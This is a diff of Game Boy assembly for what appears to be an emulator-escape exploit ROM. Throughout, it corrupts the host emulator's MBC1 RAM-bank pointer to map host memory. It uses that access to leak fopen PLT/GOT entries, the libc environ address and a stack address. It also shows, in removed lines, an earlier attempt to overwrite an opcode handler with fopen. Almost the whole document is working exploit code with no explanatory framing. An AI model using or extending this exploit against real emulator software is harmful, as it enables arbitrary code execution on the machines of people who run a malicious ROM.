@@ -7,6 +7,8 @@
 .define OAM    $FE00 ; sprite memory
 .define HRAM   $FF80 ; fast memory for LDH
 
+.define LEAK $d9c8
+
 .memoryMap
     defaultSlot 0
     slot 0 $0000 size $4000
@@ -109,30 +111,30 @@
 main:
     ; Spray pattern
     ld a, $41
-    ld hl, $8020
+    ld hl, $8200
     ld c, 9
 -   ld (hl+), a
     dec c
     jp nz, -
 
     ; Backup ptr MBC1MemoryRule::m_pRAMBanks.
-    memcpy_8 $8000 $d9c8
+    memcpy_8 $8000 LEAK
 
     ; Subtract 0x61e10 from ptr MBC1MemoryRule::m_pRAMBanks,
     ; to map a000..c000 to buffer Processor::m_Opcodes.
-    sub_ptr_3 $D9C8 $06 $1e $10
+    sub_ptr_3 LEAK $06 $1e $10
 
     ; Save Processor::OPCode0x00
-    memcpy_8 $8008 $d9c8
+    memcpy_8 $8008 LEAK
     memcpy_8 $8010 $a000
 
     ; Restore ptr MBC1MemoryRule::m_pRAMBanks.
-    ;memcpy_8 $d9c8 $8000
+    ;memcpy_8 LEAK $8000
     ;ld ($a000), a
 
     ; Leak fopen PLT entry
     sub_ptr_3 $8010 $01 $27 $d0
-    memcpy_8 $d9c8 $8010
+    memcpy_8 LEAK $8010
     ld a, ($a000) ; sanity check
 
     ; Leak fopen GOT entry PLT->GOT offset
@@ -143,14 +145,29 @@ main:
     add_ptr_3 $8018 $00 $00 $0b ; rip adjust
     ptr8_add $8018 $8010
 
-    ; Map fopen
-    memcpy_8 $d9c8 $8018
+    ; Map GOT
+    memcpy_8 LEAK $8018
+
+    ; Leak libc fopen address
+    memcpy_8 $8020 $a000
+
+    ; Leak libc environ address
+    memcpy_8 $8028 $8020
+    add_ptr_3 $8028 $16 $cc $f0
+
+    ; Map libc environ
+    memcpy_8 $d9c8 $8028
+
+    ; Leak environ stack address
+    memcpy_8 $8030 $a000
+
+    ; Map stack
+    memcpy_8 $d9c8 $8030
+    nop ; debugger
+    ld a, ($a000) ; sanity check
 
     ; Restore buffer Processor::m_Opcodes.
     memcpy_8 $d9c8 $8008
-
-    ; Set opcode 0x00 to fopen
-    memcpy_8 $a000 $8018
 
     ; Restore ptr MBC1MemoryRule::m_pRAMBanks.
     memcpy_8 $d9c8 $8000
